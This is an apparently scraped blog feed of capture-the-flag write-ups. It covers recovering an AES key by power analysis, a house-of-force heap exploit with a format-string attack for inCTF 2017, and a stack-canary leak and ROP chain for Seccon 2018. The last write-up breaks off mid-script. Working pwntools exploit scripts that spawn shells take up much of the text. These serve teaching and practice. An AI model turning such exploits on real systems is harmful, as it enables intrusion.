1bestguess[bnum] = np.argmax(maxcpa) In the end we get the complete key used in the encryption, the full script: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475import numpy as npHW = [bin(n).count(\"1\") for n in range(0,256)]sbox=(0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16)def intermediate(pt, keyguess): return sbox[pt ^ keyguess]traces = np.load('powertraces.npy')pt = np.load('plaintexts.npy')bestguess = []if bestguess == []: numtraces = np.shape(traces)[0]-1 numpoint = np.shape(traces)[1] bestguess = [0]*16 for bnum in range(0, 16): cpaoutput = [0]*256 maxcpa = [0]*256 for kguess in range(0, 256): #Initialize arrays &amp; variables to zero sumnum = np.zeros(numpoint) sumden1 = np.zeros(numpoint) sumden2 = np.zeros(numpoint) hyp = np.zeros(numtraces) for tnum in range(0, numtraces): hyp[tnum] = HW[intermediate(pt[tnum][bnum], kguess)] #Mean of hypothesis meanh = np.mean(hyp, dtype=np.float64) #Mean of all points in trace meant = np.mean(traces, axis=0, dtype=np.float64) #For each trace, do the following for tnum in range(0, numtraces): hdiff = (hyp[tnum] - meanh) tdiff = traces[tnum,:] - meant sumnum = sumnum + (hdiff*tdiff) sumden1 = sumden1 + hdiff*hdiff sumden2 = sumden2 + tdiff*tdiff cpaoutput[kguess] = sumnum / np.sqrt( sumden1 * sumden2 ) maxcpa[kguess] = max(abs(cpaoutput[kguess])) bestguess[bnum] = np.argmax(maxcpa) key = '' for b in bestguess: key += \"%02x\"%b print \"Best Key Guess: %s\" % key Running it : 12$ python leak_power.pyBest Key Guess: d2dea057d1145f456796966024a703b2 The key is d2dea057d1145f456796966024a703b2 now that we have the key we can decrypt the cyphertext, we can do this ith a few lines of go: 1234567891011121314151617181920212223242526272829303132package mainimport ( \"fmt\" \"io/ioutil\" \"os\" \"gopkg.in/square/go-jose.v2\" )// Read input from filefunc readInput(path string) []byte &#123; var bytes []byte var err error bytes, err = ioutil.ReadFile(path) exitOnError(err, \"unable to read input\") return bytes&#125;// Exit and print error message if we encountered a problemfunc exitOnError(err error, msg string) &#123; if err != nil &#123; fmt.Fprintf(os.Stderr, \"%s: %s\\n\", msg, err) os.Exit(1) &#125;&#125;func main() &#123; obj, err := jose.ParseEncrypted(string(readInput(\"instructions_corrected.jwe\"))) exitOnError(err, \"unable to parse message\") plaintext, err := obj.Decrypt(\"\\xd2\\xde\\xa0\\x57\\xd1\\x14\\x5f\\x45\\x67\\x96\\x96\\x60\\x24\\xa7\\x03\\xb2\") exitOnError(err, \"unable to decrypt message\") fmt.Print(string(plaintext))&#125; Running it we get the flag: 1234567891011121314151617181920212223242526272829$ go get gopkg.in/square/go-jose.v2$ go run aes_dec.goCONFIDENTIALTo disable C4, you will need:- 6 bits of Dragon Sumac- 1 nibble of Winter Spice- 1 byte of Drake Cardamom- 1 flag with value flag-e2f27bac480a7857de45- 2 diskfulls of Tundra Chives- 5 forksGrind the Dragon Sumac in a cup, making sure you don't break the cup as it's probably a delicate cup. Add a sprinkle ofliquid ice to turn it into a cream-like paste, then add the Winter Spice, first almost everything, then the last tinyremnants.Fill a pan with elemental water, add the mixture and cool it down with how cool you are, then bring the mixtureto a boil. Let it cool down to the body temperature of a reptile before adding the Drake Cardamom and Tundra Chives,all at once of one, then half at a time of the other.Bring everything back to a boil, turn of the heat, mix with the forks and let everything cool down. If youtouch the liquid and it burns you, it hasn't cooled down enough.Whisk the mixture heavily to aerate it. Stop when it's frothy.Drinking the potion will disable C4.note: A small, but very cold amount is needed for the potion to be effective. Mixing it in a milkshake could work, butbe wary of brain freeze. The flag was flag-e2f27bac480a7857de45 References https://www.tandfonline.com/doi/full/10.1080/23742917.2016.1231523 https://wiki.newae.com/Making_Scripts","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://teamrocketist.github.io/categories/Crypto/"}],"tags":[{"name":"aes","slug":"aes","permalink":"https://teamrocketist.github.io/tags/aes/"},{"name":"cpa","slug":"cpa","permalink":"https://teamrocketist.github.io/tags/cpa/"},{"name":"power_analysis","slug":"power-analysis","permalink":"https://teamrocketist.github.io/tags/power-analysis/"}]},{"title":"[Pwn] inCTF 2017 - Gryffindor","slug":"Pwn-inCTF-2017-Gryffindor","date":"2018-11-08T06:21:03.000Z","updated":"2019-08-17T03:20:43.377Z","comments":true,"path":"2018/11/08/Pwn-inCTF-2017-Gryffindor/","link":"","permalink":"https://teamrocketist.github.io/2018/11/08/Pwn-inCTF-2017-Gryffindor/","excerpt":"","text":"gryffindorlibc.so.6 I’ve been looking at attacks on the heap lately, since I didn’t do any kind of write-up about this I ended up looking for an old ctf challenge from inCTF 2017, I did solved this challenge some days after the ctf (not during it) but back in the day I didn’t have the time to do a write about this. The binary in this challenge was an ELF 64-bit, first thing we are likely to look up is for it’s security:1234567$ checksec gryffindor[*] '/ctf/work/ctf/inctf2017/pwn/gryffindor/gryffindor' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Now after this we want to run the binary itself so we can see what it does, the application present us with a menu which gives us 4 options: We can create a new item where we can specify the input allocation size and the index. We can delete an item by stipulating it’s index. We can edit an item by indicating it’s index then we can modify it’s content by giving it a size and the string itself. Finally we have an option to exit the binary By checking the add for option 1 we can already see some interesting things : Now checking the delete option 2, doesn’t look we have any kind of vulnerabilities: Finally on option 3 edit we can find a heap overflow vulnerability: House of Force the Jedi OverflowThis attack focuses on making malloc return an arbitrary pointer, we can achieve this by exploiting the top_chunk… The top most chunk also known as the ‘wilderness’. This assumes an overflow into the top chunk’s header (we have an overflow as we saw in option 3), if we can overflow and modify the top_chunk size into a very large value, all the initial requests will be services using the top chunk, instead of relying on mmap. If we set it into -1 this will be evaluated into 0xFFFFFFFFFFFFFFFF in a 64 bit binary. Assuming we as the attackers want to make make malloc to return an address p, after we set the size into -1 any malloc call with the size of P- &amp;top_chunk will return P as a pointer to that address. If we force malloc to return a pointer of our choice we will gain an arbitrary write to that address. The Ingredients to perform this attack can be looked as follows: The exploiter must be able to overwrite the top chunk (i.e. the overflow must happen in a chunk that allows to overwrite the wilderness). There is a malloc() call with an exploiter-controllable size. There is another malloc() call where data are controlled by the exploiter. A leaked heap address so we can calculate the size required to force malloc return the address we want. As we can look above we have almost everything, the only thing’s missing is the last point we don’t have any heap address leaked and after our analysis there isn’t any kind of vulnerability to leak any kind of addresses… Well we missed this function:As we can see above the author of the challenge was nice enough to give us the a leak for free. Replace atoi with printf for format string vulnerabilityNow that we have all the ingredients we can put house of force into practice, first lets write some functions add and edit options, and extract the heap address: 1234567891011121314151617181920212223242526272829303132from pwn import *import sysdef add_g(size, index): r.recv() r.sendline('1') r.recv() r.sendline(size) r.recv() r.sendline(index)def edit_g(size, index, inp, choice='3'): r.recv() r.sendline(choice) r.recv() r.sendline(index) r.recv() r.sendline(size) r.sendline(inp)context.terminal = ['tmux', 'new-window']binary = ELF('./gryffindor')libc = ELF('libc.so.6')r = process('./gryffindor', env=&#123;'LD_LIBRARY_PATH': os.path.join(os.getcwd(),\"./libc.so.6\")+\" \"+sys.path[0]&#125;)#gdb.attach(r, \"\"\"# b *0x400bd9# \"\"\")r.recv()r.sendline('1337')heap = int(r.recv(9),16)+0x1b0log.info('[X] LEAKED HEAP 0x%x' % (heap))add_g('130', '0') The 0x1b0 offset which is offset to top_chunk can be calculated as follows: Overflowing wilderness size1234################################################################################ HOUSE OF FORCEadd_g('130', '0')edit_g(str(18*8), '0','A'*17*8 + p64(-1,signed=True)) Looking at the heap after we overflow it: Now we can force malloc to return the pointer P we need by just passing the calculation P - &amp;top_chunk as the size, after this the next malloc will return the pointer we want: 12345678910################################################################################ HOUSE OF FORCE - Replace atoi with printf to gain format string vulnerabilityadd_g('130', '0')edit_g(str(18*8), '0','A'*17*8 + p64(-1,signed=True))add_g(str(binary.got['atoll']-top_chunk), '1')add_g('130', '2') # this malloc will return got address of atolledit_g('130', '2', p64(binary.plt['atoll']+6) + p64(binary.plt['malloc']+6) + p64(binary.plt['setvbuf']+6) + p64(binary.plt['printf']+6)) The look on gdb after executing malloc: atoll and atoi are different functions they almost do the same thing yet they are being used in different places in the binary, the one we want is actually atoi, you must be asking why didn’t I used house of force on the atoi address, well when I was using the atoi address with house of force for some reason I was getting an segmentation fault, can’t really explain why because I didn’t understand it, well if you know why this happens feel free to write in the comments I would really appreciate that. To circumvent this I used the atoll GOT, we can still overwrite atoi but we will need to override other got addresses because malloc, setvbuf are between them as you can see bellow: So to not break the binary we should not override them with junk so thats why i’m setting it to their plts in this line of code: 1234edit_g('130', '2', p64(binary.plt['atoll']+6) + p64(binary.plt['malloc']+6) + p64(binary.plt['setvbuf']+6) + p64(binary.plt['printf']+6)) Now that we override the atoi GOT with the printf PLT we can use format_string to leak addresses from the stack: 1234567891011121314151617181920212223##################################################### LEAK LIBCr.recv()time.sleep(0.1)r.sendline('%p %p %p')s = r.recv()list_addr = s.split(' ')STACK_ADDRESS = int(list_addr[0],16)+168-32-32leaked = int(list_addr[2][:-8].rstrip(),16)LIBC_BASE = leaked-0xf7260SYSTEM = LIBC_BASE + libc.symbols['system']ONE_GADGET = LIBC_BASE + 0x4526aONE_GADGET_LOW = ONE_GADGET &amp; 0xffffffffONE_GADGET_HIGH = (ONE_GADGET &amp; 0xffffffff00000000) &gt;&gt; 32log.info('[X] LEAKED 0x%x' % (leaked))log.info('[X] LEAKED LIBC_BASE 0x%x' % LIBC_BASE)log.info('[X] LEAKED STACK_ADDRESS 0x%x' % STACK_ADDRESS)log.info('[X] LEAKED SYSTEM 0x%x' % SYSTEM)log.info('[X] LEAKED LOW_ONE_GADGET 0x%x' % ONE_GADGET_LOW)log.info('[X] LEAKED HIGH_ONE_GADGET 0x%x' % ONE_GADGET_HIGH)#################################################### After printf is executed, if we leak the first 3 addresses from the stack we can see the 1st one is an address from the stack and the 3rd is an address from libc, we can calculate the offset to the by using gdb Spawning a shellI ended up doing this in two ways: Overwriting exit GOT address with one_gadget by using format string. Overwriting atoi GOT address (now printf) with system from libc, and send /bin/sh as string. I will explain the first one since it’s a little more difficult and the 2nd is just a repetition of what we did before with the only difference of atoi is now printf, which can complicate a little bit the things: Format String123456789101112131415161718192021222324252627282930ONE_GADGET = LIBC_BASE + 0x4526aONE_GADGET_LOW = ONE_GADGET &amp; 0xffffffffONE_GADGET_HIGH = (ONE_GADGET &amp; 0xffffffff00000000) &gt;&gt; 32r.send('%&#123;&#125;x%9$hn'.format(ONE_GADGET_HIGH)+ 'A'*12+p64(binary.got['exit']+4))r.recv()ONE_GADGET_LOW0 = ONE_GADGET_LOW &gt;&gt; 16ONE_GADGET_LOW1 = ONE_GADGET_LOW &amp; 0xffffr.send('%&#123;&#125;x%9$hn'.format(ONE_GADGET_LOW0)+ 'A'*12+p64(binary.got['exit']+2))r.recvuntil('&gt;&gt;')r.send('%&#123;&#125;x%9$hn'.format(ONE_GADGET_LOW1)+ 'A'*12+p64(binary.got['exit']))r.recvuntil('&gt;&gt;')r.send('%7$llnCC'+ p64(STACK_ADDRESS)) # sets the one_gadget constraint to nullr.recvuntil('&gt;&gt;')time.sleep(0.3)r.sendline('111') # sends option 4 to exit the program # atoi is now printf, the return value # of printf is the number of characters # printed so if we want option 4 we need # to send 4 chars, in this case 3 \"1s\" and # \"\\n\" new line characterr.interactive() I separated the one_gadget from libc address in 3 parts so it’s easier to perform the format string, I won’t explain how I did it in detail, if you want to learn how to do a format string in detail you can check my other write up here, to get the offset for the one_gadget you can use this tool: 12345678910111213141516$ one_gadget libc.so.6 0x45216 execve(\"/bin/sh\", rsp+0x30, environ)constraints: rax == NULL0x4526a execve(\"/bin/sh\", rsp+0x30, environ)constraints: [rsp+0x30] == NULL0xf0274 execve(\"/bin/sh\", rsp+0x50, environ)constraints: [rsp+0x50] == NULL0xf1117 execve(\"/bin/sh\", rsp+0x70, environ)constraints: [rsp+0x70] == NULL I used the offset 0x4526a it has a constraint in rsp+0x30, we can use once again format string to set this constraints to null, since we leaked a stack address before we can calculate the offset from the leaked adress with the same trick we used to calculate the offset to libc_base by using gdb. The full exploit using format string 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889from pwn import *import sysdef add_g(size, index): r.recv() r.sendline('1') r.recv() r.sendline(size) r.recv() r.sendline(index)def edit_g(size, index, inp, choice='3'): r.recv() r.sendline(choice) r.recv() r.sendline(index) r.recv() r.sendline(size) r.sendline(inp)context.terminal = ['tmux', 'new-window']binary = ELF('./gryffindor')libc = ELF('libc.so.6')r = process('./gryffindor', env=&#123;'LD_LIBRARY_PATH': os.path.join(os.getcwd(),\"./libc.so.6\")+\" \"+sys.path[0]&#125;)#gdb.attach(r, \"\"\"# b *0x400bd9# \"\"\")r.recv()r.sendline('1337')top_chunk = int(r.recv(9),16)+0x1b0log.info('[X] LEAKED HEAP 0x%x' % (top_chunk))################################################################################ HOUSE OF FORCE - Replace atoi with printf to gain format string vulnerabilityadd_g('130', '0')edit_g(str(18*8), '0','A'*17*8 + p64(-1,signed=True))add_g(str(binary.got['atoll']-top_chunk), '1')add_g('130', '2')edit_g('130', '2', p64(binary.plt['atoll']+6) + p64(binary.plt['malloc']+6) + p64(binary.plt['setvbuf']+6) + p64(binary.plt['printf']+6))##################################################### LEAK LIBCr.recv()time.sleep(0.1)r.sendline('%p %p %p')s = r.recv()list_addr = s.split(' ')STACK_ADDRESS = int(list_addr[0],16)+168-32-32leaked = int(list_addr[2][:-8].rstrip(),16)LIBC_BASE = leaked-0xf7260SYSTEM = LIBC_BASE + libc.symbols['system']ONE_GADGET = LIBC_BASE + 0x4526aONE_GADGET_LOW = ONE_GADGET &amp; 0xffffffffONE_GADGET_HIGH = (ONE_GADGET &amp; 0xffffffff00000000) &gt;&gt; 32log.info('[X] LEAKED 0x%x' % (leaked))log.info('[X] LEAKED LIBC_BASE 0x%x' % LIBC_BASE)log.info('[X] LEAKED STACK_ADDRESS 0x%x' % STACK_ADDRESS)log.info('[X] LEAKED SYSTEM 0x%x' % SYSTEM)log.info('[X] LEAKED LOW_ONE_GADGET 0x%x' % ONE_GADGET_LOW)log.info('[X] LEAKED HIGH_ONE_GADGET 0x%x' % ONE_GADGET_HIGH)##################################################### Replace exit got with one_gadget using format stringr.send('%&#123;&#125;x%9$hn'.format(ONE_GADGET_HIGH)+ 'A'*12+p64(binary.got['exit']+4))r.recv()ONE_GADGET_LOW0 = ONE_GADGET_LOW &gt;&gt; 16ONE_GADGET_LOW1 = ONE_GADGET_LOW &amp; 0xffffr.send('%&#123;&#125;x%9$hn'.format(ONE_GADGET_LOW0)+ 'A'*12+p64(binary.got['exit']+2))r.recvuntil('&gt;&gt;')r.send('%&#123;&#125;x%9$hn'.format(ONE_GADGET_LOW1)+ 'A'*12+p64(binary.got['exit']))r.recvuntil('&gt;&gt;')r.send('%7$llnCC'+ p64(STACK_ADDRESS)) # sets the one_gadget constraint to nullr.recvuntil('&gt;&gt;')time.sleep(0.3)r.sendline('111') # sends option 4 to exit the program#####################################################r.interactive() The exploit using house of force a 2nd time to spawn a shell 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293from pwn import *import sysdef add_g(size, index): r.recv() r.sendline('1') r.recv() r.sendline(size) r.recv() r.sendline(index)def edit_g(size, index, inp, choice='3'): if choice == '3': r.recv() r.sendline(choice) else: r.send(choice) r.recv() r.sendline(index) r.recv() if choice == '3': r.sendline(size) r.sendline(inp) else: r.send(size) r.sendline(inp)#print sys.path[0]#exit(0)context.terminal = ['tmux', 'new-window']binary = ELF('./gryffindor')libc = ELF('libc.so.6')r = process('./gryffindor', env=&#123;'LD_LIBRARY_PATH': os.path.join(os.getcwd(),\"./libc.so.6\")+\" \"+sys.path[0]&#125;)#gdb.attach(r, \"\"\"# b *0x400af0# \"\"\")# b *0x400bd9# b *0x400BCD# \"\"\")# b *0x400BB5# b *0x400989# b *0x400bd9# b *0x400BD9# \"\"\")r.recv()r.sendline('1337')heap = int(r.recv(9),16)+0x1b0log.info('[X] LEAKED HEAP 0x%x' % (heap))################################################################################ HOUSE OF FORCE - Replace atoi with printf to gain format string vulnerabilityadd_g('130', '0')edit_g(str(18*8), '0','A'*17*8 + p64(-1,signed=True))add_g(str(binary.got['atoll']-heap), '1')add_g('130', '2')edit_g('130', '2', p64(binary.plt['atoll']+6) + p64(binary.plt['malloc']+6) + p64(binary.plt['setvbuf']+6) + p64(binary.plt['printf']+6))#edit_g('130', '2', p64(binary.plt['read']+6))##################################################### LEAK LIBCr.recv()time.sleep(0.1)r.sendline('%p %p %p')s = r.recv()list_addr = s.split(' ')STACK_ADDRESS = int(list_addr[0],16)+168leaked = int(list_addr[2][:-8].rstrip(),16)LIBC_BASE = leaked-0xf7260SYSTEM = LIBC_BASE + libc.symbols['system']ONE_GADGET = LIBC_BASE + 0xf1117ONE_GADGET_LOW = ONE_GADGET &amp; 0xffffffffONE_GADGET_HIGH = (ONE_GADGET &amp; 0xffffffff00000000) &gt;&gt; 32log.info('[X] LEAKED 0x%x' % (leaked))log.info('[X] LEAKED LIBC_BASE 0x%x' % LIBC_BASE)log.info('[X] LEAKED STACK_ADDRESS 0x%x' % STACK_ADDRESS)log.info('[X] LEAKED SYSTEM 0x%x' % SYSTEM)log.info('[X] LEAKED LOW_ONE_GADGET 0x%x' % ONE_GADGET_LOW)log.info('[X] LEAKED HIGH_ONE_GADGET 0x%x' % ONE_GADGET_HIGH)#exit(0)##################################################### Replace exit got with one_gadget using format stringrop = p64(binary.plt['atoll']+6) + \\ p64(binary.plt['malloc']+6) + \\ p64(binary.plt['setvbuf']+6) + \\ p64(SYSTEM)edit_g('A'*31+'\\x00', '22\\x00', rop, choice='111\\x00')r.recvuntil('&gt;&gt;')r.send('/bin/sh\\x00')#r.recvuntil('&gt;&gt;')r.interactive() References https://theswissbay.ch/pdf/_to_sort/heap-exploitation.pdf https://gbmaster.wordpress.com/2015/06/28/x86-exploitation-101-house-of-force-jedi-overflow/","categories":[{"name":"Pwn","slug":"Pwn","permalink":"https://teamrocketist.github.io/categories/Pwn/"},{"name":"x64","slug":"Pwn/x64","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/"},{"name":"Glibc Malloc","slug":"Pwn/x64/Glibc-Malloc","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"},{"name":"House of Force","slug":"Pwn/x64/Glibc-Malloc/House-of-Force","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/House-of-Force/"},{"name":"Heap Overflow","slug":"Pwn/x64/Heap-Overflow","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Heap-Overflow/"},{"name":"Format String","slug":"Pwn/x64/Format-String","permalink":"https://teamrocketist.github.io/categories/Pwn/x64/Format-String/"}],"tags":[{"name":"format_string","slug":"format-string","permalink":"https://teamrocketist.github.io/tags/format-string/"},{"name":"heap_overflow","slug":"heap-overflow","permalink":"https://teamrocketist.github.io/tags/heap-overflow/"},{"name":"inctf2017","slug":"inctf2017","permalink":"https://teamrocketist.github.io/tags/inctf2017/"}]},{"title":"[Pwn] Seccon 2018 - Profile","slug":"Pwn-Seccon-2018-Profile","date":"2018-11-04T16:46:32.000Z","updated":"2018-11-06T03:57:42.860Z","comments":true,"path":"2018/11/04/Pwn-Seccon-2018-Profile/","link":"","permalink":"https://teamrocketist.github.io/2018/11/04/Pwn-Seccon-2018-Profile/","excerpt":"","text":"Profile25564 SolvesHost: profile.pwn.seccon.jpPort: 28553profile_e814c1a78e80ed250c17e94585224b3f3be9d383libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253 We have a 64 bit binary, we can start by checking it’s security with checksec: 1234567$ checksec profile_e814c1a78e80ed250c17e94585224b3f3be9d383 [*] '/ctf/work/ctf/seccon2018/pwn/profile/profile_e814c1a78e80ed250c17e94585224b3f3be9d383' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) ELF protections and how to bypass them:NX (Non-executable stack) this can be circumvented using ROP (Return oriented programming). Partial RELRO makes almost no difference, other than it forces the GOT to come before the BSS in memory, eliminating the risk of a buffer overflows on a global variable overwriting GOT entries. Stack Canary random value positioned just before the saved ebp and the return address, if this value is somehow changed for example with a buffer overflow, the program throws an exception preventing an attack, one way to bypass this is by finding a way to leak addresses from the stack , the value we want is obviously the canary itself. Finding a way to leak addressesResuming a little bit what the program does, we can create a profile with the specific fields name, age and message, later on we are presented a menu where we can update our message, print our profile and exit. The profile creation part in the beginning doesn’t seem to have any kind of vulnerability, the strings are being created with std::string which is being defined using the std::basic_string class template, which has three template parameters, on ida a std::string shows up like this: 1std::__cxx11::basic_string&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;::basic_string(&amp;v14, argv); Nothing seems wrong in here, we have a lot of string declarations with std::string, the input reading from the user cin class from c++ which is fine against overflows. The only thing left now is the methods of the class profile Profile::update_msg and Profile::show, so just by reading the names of this methods we can already deduce what is going to happen, update_msg is probably where we are going to find some kind of overflow (receives user input to update profile msg), and on show is probably where we are going to leak addresses from memory, because it involves printing fields from our class object profile. Profile::update_msgOnce again std::string is being used, one particular optimization of the std::string object is when receives small strings it creates small buffer, which saves dynamic allocations. Which means, when small strings are passed to the constructor (len &lt; 16) it string is stored in the stack instead of allocating on the heap, we can verify this easily if we create a c++ program and modify the new constructor to print some debugging : 123456789101112131415161718#include &lt;cstdlib&gt;#include &lt;iostream&gt;#include &lt;string&gt;// replace operator new and delete to log allocationsvoid* operator new(std::size_t n) &#123; std::cout &lt;&lt; \"[Allocating \" &lt;&lt; n &lt;&lt; \" bytes]\"; return malloc(n);&#125;void operator delete(void* p) throw() &#123; free(p);&#125;int main() &#123; for (size_t i = 0; i &lt; 24; ++i) &#123; std::cout &lt;&lt; i &lt;&lt; \": \" &lt;&lt; std::string(i, '=') &lt;&lt; std::endl; &#125;&#125; The output 1234567891011121314151617181920212223240:1: =2: ==3: ===4: ====5: =====6: ======7: =======8: ========9: =========10: ==========11: ===========12: ============13: =============14: ==============15: ===============[Allocating 32 bytes]16: ================[Allocating 32 bytes]17: =================[Allocating 32 bytes]18: ==================[Allocating 32 bytes]19: ===================[Allocating 32 bytes]20: ====================[Allocating 32 bytes]21: =====================[Allocating 32 bytes]22: ======================[Allocating 32 bytes]23: ======================= Now looking at the code right after the declaration of std:string a function named MALLOC_USABLE_SIZE according to the man pages it says it obtains size of block of memory allocated from heap , but what happens if nothing we pass a pointer from the stack? the unexpected will happen this function will return -8 (0xfffffffffffffff8), this value won’t be interpreted as negative but as a very high number because the variables are declared as unsigned ints, this will later be passed to the stop loop condition of getn function, entering into a infinite loop and only stops when a new line (0xa) is found which will lead to a buffer overflow. UpdateMessage function getn function On GDB after MALLOC_USABLE_SIZE, the value is returned into rax Now if we do some testing to check what is in the stack after we use update message with 8‘A’ and 8‘B’: The values from the stack Some gdb commands that might help you finding the stack canary and ret addr Leaking the libc is easy, we just need to set a got address to leak it, but how do we leak the canary? We need to find a way to leak an address from the stack, having this we can calculate its offset to the canary address, but how do we do this? we can take advantage of the fact that we have a large part of the address of the pointer to profile.name, if we only modify the last byte of the pointer of profile.name and we just need to keep iterating from 0x00 to 0xff until we reach the address of the string that we inserted 0x4141414141414141, after that it is a matter of only adding another 0x10 and we can expose that address of the stack, getting this we just need to do the difference between this address and the canary. The leaked values will show up after “Name: “, because we are changing the value of the pointer to profile.name in the stack! with this if we print the profile, the profile.name will print the pointer we changed… Part of the code to calculate this offset:1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162from pwn import *def getConn(): #d = os.environ #d['LD_PRELOAD'] = './libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253' return process(filename, env=&#123;'LD_PRELOAD':'./libc-2.23'&#125;) if local else remote(host, port)def leakAddr(addr, bytes_to_read=6): r.recv() r.sendline('1') r.recv() r.sendline('A'*8 + 'B'*8 + addr) r.recv() r.sendline('2') r.recvuntil('Name : ') return u64(r.recv(bytes_to_read).ljust(8, '\\x00'))context.terminal = ['tmux', 'new-window']filename = './profile_e814c1a78e80ed250c17e94585224b3f3be9d383'host = 'profile.pwn.seccon.jp'port = 28553local = Truebinary = ELF(filename)libc = ELF('libc-2.23')POPRET = 0x401713LEAKED_ADDR = 0x0i = 0r = getConn()gdb.attach(r, ''' b *0x4011e1 b *0x4013C9 b *0x40148D ''')r.recv()r.sendline('2'*15)r.recv()r.sendline('3')r.recv()r.sendline('4')log.info('----------Searching for the offset-------------') while LEAKED_ADDR != 0x414141414141 and i &lt; 0xff: LEAKED_ADDR = leakAddr(p8(i)) log.info(\"LEAKED ADDR 0x%x 0x%x\" % (LEAKED_ADDR,i)) i += 0x10if i &gt; 0xff: print 'Unluckly couldn\\'t find the string position' r.close() exit(0) LEAKED_ADDR = leakAddr(p8(i))log.info('------------------Offset Found-----------------')CANARY_ADDR = LEAKED_ADDR+0x28log.info(\"LEAKED ADDR 0x%x\" % LEAKED_ADDR)log.info(\"CANARY ADDR 0x%x\" % (CANARY_ADDR))CANARY = leakAddr(p64(CANARY_ADDR) ,bytes_to_read=8)log.info(\"Canary 0x%x\" % CANARY) Leaking libcNow that we have the stack canary we can easily leak libc, we don’t even need to calculate offsets we just need to use the global offset table, we can use the GOT entry of read, and then calculate the offsets with the help of pwntools since we are loading the libc file in the beginning: 123456789READ = leakAddr(p64(binary.got['read']))LIBCBASE = READ - libc.symbols['read']SYSTEM = LIBCBASE + libc.symbols['system']BINSH = LIBCBASE + libc.search('/bin/sh\\x00').next()EXIT = LIBCBASE + libc.symbols['exit']log.info(\"READ 0x%x\" % READ)log.info(\"LIBC 0x%x\" % LIBCBASE)log.info(\"SYSTEM 0x%x\" % SYSTEM)log.info(\"BINSH 0x%x\" % BINSH) Now that we have all the libc we just need to build our rop chain, we need to find a gadget that puts /bin/sh into rdi, we can do this with POP RDI ; RET which will get the value in the top of the stack into RDI, after this we can call system, for a more detailed description you can read this write up on about to write a ropchain (it’s a little different because on this link the binary is statically linked instead of dynamically). 1234567ropchain = ''ropchain += p64(POPRET) # POP RDI; RETropchain += p64(BINSH) # BINSH ADDRESS ARG[1]ropchain += p64(SYSTEM) # SYSTEM function \"call\"ropchain += p64(EXIT) # EXIT Actually useless you don't really# need to exit, but I usually like to exit without an error And now that we have everything we can calculate the final offsets:The rest of the code: 1234567r.sendline('1')r.recv()r.sendline(p64(0) * 7 + p64(CANARY) + p64(0)*3 + ropchain)r.recv()r.sendline('0')r.recv()r.interactive() The full code exploit: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889from pwn import *def getConn(): #d = os.environ #d['LD_PRELOAD'] = './libc-2.23.so_56d992a0342a67a887b8dcaae381d2cc51205253' return process(filename, env=&#123;'LD_PRELOAD':'./libc-2.23'&#125;) if local else remote(host, port)def leakAddr(addr, bytes_to_read=6): r.recv() r.sendline('1') r.recv() r.sendline('A'*8 + 'B'*8 + addr) r.recv() r.sendline('2') r.recvuntil('Name : ') return u64(r.recv(bytes_to_read).ljust(8, '\\x00'))context.terminal = ['tmux', 'new-window']filename = './profile_e814c1a78e80ed250c17e94585224b3f3be9d383'host = 'profile.pwn.seccon.jp'port = 28553local = Falsebinary = ELF(filename)libc = ELF('libc-2.23')POPRET = 0x401713LEAKED_ADDR = 0x0i = 0r = getConn()#gdb.attach(r, '''# b *0x4011e1# b 